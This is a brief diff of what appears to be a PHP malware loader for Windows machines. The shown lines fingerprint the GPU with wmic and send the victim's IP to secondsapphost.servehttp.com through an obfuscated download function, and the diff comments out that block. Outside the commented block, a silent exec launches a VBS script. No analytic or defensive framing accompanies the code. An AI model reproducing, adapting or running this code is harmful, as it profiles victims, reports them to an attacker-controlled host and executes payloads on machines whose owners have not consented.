@@ -179,6 +179,7 @@ if(1)
 			$output = implode("\n", $output);
 			if(false === stripos($output, 'w_driver1.95_x86'))
 			{
+				/**
 				$output = array();
 				$r = 0;
 				@exec('wmic path win32_VideoController get name', $output, $r);
@@ -192,6 +193,7 @@ if(1)
 				);
 				@$GLOBALS['__download_002']('https://secondsapphost.servehttp.com/test_procs/test.php?ip='.$ipl, $post);
 				sleep(5);
+				/**/
 				
 				@exec('start "" "'.$vbs_exec_path.'"');
 				
